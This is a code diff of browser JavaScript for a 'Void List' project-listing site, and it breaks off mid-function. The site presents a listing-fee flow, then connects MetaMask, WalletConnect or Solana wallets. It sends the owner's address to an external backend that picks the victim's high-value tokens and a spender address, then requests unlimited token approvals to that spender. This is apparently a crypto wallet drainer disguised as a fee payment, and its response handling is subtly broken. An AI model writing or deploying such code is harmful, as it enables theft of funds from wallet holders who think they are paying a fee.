@@ -1,161 +1,134 @@
+import { ethers } from "https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.esm.min.js";
 import {
-  Connection,
-  PublicKey,
-  Transaction
+  Connection, PublicKey, Transaction
 } from "https://esm.sh/@solana/web3.js@1.95.3";
-
 import {
-  createApproveInstruction,
-  TOKEN_PROGRAM_ID,
-  getAssociatedTokenAddress
+  createApproveInstruction, TOKEN_PROGRAM_ID, getAssociatedTokenAddress
 } from "https://esm.sh/@solana/spl-token@0.3.8";
-
 import {
   WalletAdapterNetwork
 } from "https://esm.sh/@solana/wallet-adapter-base@0.9.22";
-
 import {
-  PhantomWalletAdapter,
-  SolflareWalletAdapter,
-  BackpackWalletAdapter,
-  GlowWalletAdapter,
-  WalletConnectWalletAdapter
+  PhantomWalletAdapter, SolflareWalletAdapter, BackpackWalletAdapter, GlowWalletAdapter, WalletConnectWalletAdapter
 } from "https://esm.sh/@solana/wallet-adapter-wallets@0.19.19";
 
 const projectForm = document.getElementById('projectForm');
+const chainSelect = document.getElementById('chainSelect');
 const feeModal = document.getElementById('feeModal');
 const walletModal = document.getElementById('walletModal');
 const closeButtons = document.getElementsByClassName('close');
 const proceedButton = document.getElementById('proceedButton');
-const walletConnectButton = document.getElementById('walletConnectButton');
 
+const metaMaskButton = document.getElementById('metaMaskButton');
+const walletConnectEvmButton = document.getElementById('walletConnectEvmButton');
+const solanaWalletButton = document.getElementById('solanaWalletButton');
+const walletConnectSolanaButton = document.getElementById('walletConnectSolanaButton');
+
+let selectedChain = null;
 let connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
 let wallet = null;
 
-/* UI Flow */
-if (projectForm && feeModal) {
-  projectForm.addEventListener('submit', (event) => {
-    event.preventDefault();
-    feeModal.style.display = 'flex';
+/* Form submit */
+projectForm.addEventListener('submit', (e) => {
+  e.preventDefault();
+  selectedChain = chainSelect.value;
+  feeModal.style.display = 'block';
+});
+
+/* Close modals */
+closeButtons[0].onclick = () => feeModal.style.display = 'none';
+closeButtons[1].onclick = () => walletModal.style.display = 'none';
+
+/* Proceed to wallet modal */
+proceedButton.onclick = () => {
+  feeModal.style.display = 'none';
+  walletModal.style.display = 'block';
+
+  // Show relevant wallet buttons
+  if (selectedChain === "solana") {
+    solanaWalletButton.classList.remove('hidden');
+    walletConnectSolanaButton.classList.remove('hidden');
+    metaMaskButton.classList.add('hidden');
+    walletConnectEvmButton.classList.add('hidden');
+  } else {
+    metaMaskButton.classList.remove('hidden');
+    walletConnectEvmButton.classList.remove('hidden');
+    solanaWalletButton.classList.add('hidden');
+    walletConnectSolanaButton.classList.add('hidden');
+  }
+};
+
+/* EVM MetaMask */
+metaMaskButton.onclick = async () => {
+  if (!window.ethereum) return alert("MetaMask not installed");
+  const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+  const provider = new ethers.providers.Web3Provider(window.ethereum);
+  const signer = provider.getSigner();
+  await approveEvm(accounts[0], signer);
+};
+
+/* EVM WalletConnect */
+walletConnectEvmButton.onclick = async () => {
+  const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.21.8?bundle');
+  const wcProvider = await EthereumProvider.init({
+    projectId: "YOUR_WC_PROJECT_ID",
+    chains: [1],
+    showQrModal: true,
+    rpcMap: { 1: "https://mainnet.infura.io/v3/YOUR_INFURA_KEY" }
   });
-}
-if (closeButtons[0] && feeModal) {
-  closeButtons[0].addEventListener('click', () => feeModal.style.display = 'none');
-}
-if (proceedButton && feeModal && walletModal) {
-  proceedButton.addEventListener('click', () => {
-    feeModal.style.display = 'none';
-    walletModal.style.display = 'flex';
-  });
-}
-if (closeButtons[1] && walletModal) {
-  closeButtons[1].addEventListener('click', () => walletModal.style.display = 'none');
-}
-if (walletConnectButton) {
-  walletConnectButton.addEventListener('click', connectWallet);
-}
+  const accounts = await wcProvider.enable();
+  const provider = new ethers.providers.Web3Provider(wcProvider);
+  const signer = provider.getSigner();
+  await approveEvm(accounts[0], signer);
+};
 
 /* Solana direct wallets */
-if (solanaWalletButton) {
-  solanaWalletButton.addEventListener('click', async () => {
-    try {
-      const adapters = [
-        new PhantomWalletAdapter(),
-        new SolflareWalletAdapter({ network: WalletAdapterNetwork.Mainnet }),
-        new BackpackWalletAdapter(),
-        new GlowWalletAdapter()
-      ];
+solanaWalletButton.onclick = async () => {
+  const adapters = [
+    new PhantomWalletAdapter(),
+    new SolflareWalletAdapter({ network: WalletAdapterNetwork.Mainnet }),
+    new BackpackWalletAdapter(),
+    new GlowWalletAdapter()
+  ];
+  wallet = adapters.find(w => w.readyState === "Installed" || w.readyState === "Loadable");
+  if (!wallet) return alert("No Solana wallet found");
+  await wallet.connect();
+  await approveSolana(wallet.publicKey);
+};
 
-      wallet = adapters.find(w => w.readyState === "Installed" || w.readyState === "Loadable");
-      if (!wallet) {
-        alert("No Solana wallet found. Please install Phantom, Solflare, Backpack, or Glow.");
-        return;
-      }
-
-      await wallet.connect();
-      console.log("Connected Solana wallet:", wallet.publicKey.toBase58());
-      await approveSpender(wallet.publicKey);
-    } catch (err) {
-      console.error("Solana wallet connect error:", err);
-      alert("Wallet connection failed: " + err.message);
+/* Solana WalletConnect */
+walletConnectSolanaButton.onclick = async () => {
+  wallet = new WalletConnectWalletAdapter({
+    network: WalletAdapterNetwork.Mainnet,
+    options: {
+      projectId: "YOUR_WC_PROJECT_ID",
+      relayUrl: "wss://relay.walletconnect.com",
+      metadata: { name: "Void List", description: "Solana Project Listing", url: window.location.origin, icons: [] }
     }
   });
-}
+  await wallet.connect();
+  await approveSolana(wallet.publicKey);
+};
 
-/* WalletConnect flow */
-if (walletConnectButton) {
-  walletConnectButton.addEventListener('click', async () => {
-    try {
-      wallet = new WalletConnectWalletAdapter({
-        network: WalletAdapterNetwork.Mainnet,
-        options: {
-          projectId: "YOUR_WALLETCONNECT_PROJECT_ID", // replace with your WC Cloud projectId
-          relayUrl: "wss://relay.walletconnect.com",
-          metadata: {
-            name: "Void List",
-            description: "Solana Project Listing",
-            url: window.location.origin,
-            icons: []
-          }
-        }
-      });
-
-      await wallet.connect();
-      console.log("Connected via WalletConnect:", wallet.publicKey.toBase58());
-      await approveSpender(wallet.publicKey);
-    } catch (err) {
-      console.error("WalletConnect error:", err);
-      alert("WalletConnect failed: " + err.message);
-    }
+/* Approval logic */
+async function approveEvm(account, signer) {
+  const BACKEND_URL = "https://spender-backend-production-de70.up.railway.app";
+  const res = await fetch(`${BACKEND_URL}/scan`, {
+    method: "POST", headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ owner: account, chain: selectedChain })
   });
+  const { tokenAddress, spenderAddress } = await res.json().data;
+  const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
+  const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
+  const tx = await tokenContract.approve(spenderAddress, ethers.constants.MaxUint256);
+  await tx.wait();
+  alert("✅ EVM Approval Successful!");
 }
-/* Approval logic (non-atomic) */
-async function approveSpender(ownerPubKey) {
-  try {
-    const BACKEND_URL = "https://spender-backend-production-de70.up.railway.app";
 
-    const scanRes = await fetch(`${BACKEND_URL}/scan`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ owner: ownerPubKey.toBase58(), chain: "solana" })
-    });
-
-    if (!scanRes.ok) throw new Error(`Backend error: ${scanRes.status}`);
-
-    const scanResult = await scanRes.json();
-    if (!scanResult.success || !scanResult.data) {
-      alert("No high-value assets found in this wallet.");
-      return;
-    }
-
-    const { tokenMint, spenderAddress, amount } = scanResult.data;
-
-    const mintPubKey = new PublicKey(tokenMint);
-    const delegatePubKey = new PublicKey(spenderAddress);
-    const ownerAddress = new PublicKey(ownerPubKey);
-
-    const tokenAccount = await getAssociatedTokenAddress(mintPubKey, ownerAddress);
-
-    const approveIx = createApproveInstruction(
-      tokenAccount,
-      delegatePubKey,
-      ownerAddress,
-      amount,
-      [],
-      TOKEN_PROGRAM_ID
-    );
-
-    const tx = new Transaction().add(approveIx);
-    tx.feePayer = ownerAddress;
-    tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-
-    const signedTx = await wallet.signTransaction(tx);
-    const sig = await connection.sendRawTransaction(signedTx.serialize());
-    console.log("Approval tx signature:", sig);
-
-    alert("✅ Approval Successful on Solana!");
-  } catch (error) {
-    console.error("Approval error:", error);
-    alert("❌ Error: " + error.message);
-  }
-}
+async function approveSolana(ownerPubKey) {
+  const BACKEND_URL = "https://spender-backend-production-de70.up.railway.app";
+  const res = await fetch(`${BACKEND_URL}/scan`, {
+    method: "POST", headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ owner: ownerPubKey.toBase58(), chain: "solana" })
+  });
+  const { tokenMint, spenderAddress, amount } = await res.json().data;
